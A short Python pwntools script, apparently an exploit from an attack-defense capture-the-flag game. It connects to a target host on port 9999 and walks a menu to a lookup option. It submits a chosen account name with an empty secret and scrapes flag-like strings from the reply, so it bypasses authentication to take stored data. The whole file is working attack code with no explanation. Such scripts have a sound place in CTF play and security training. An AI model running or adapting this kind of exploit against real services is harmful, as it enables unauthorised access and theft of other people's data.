#!/usr/bin/env python3

from pwn import *
import re
import sys

if __name__ == "__main__":

    r = remote(sys.argv[1], 9999)

    ass_name = argv[2]
    r.recvuntil(b"> ")
    r.sendline(b"3")

    r.recvuntil(b": ")
    r.sendline(ass_name.encode())

    r.recvuntil(b": ")
    r.sendline("")

    print(re.findall(b"[A-Z0-9]{31}=", r.recvline()))

    r.recvuntil(b"> ")
    r.sendline(b"6")
    r.close()
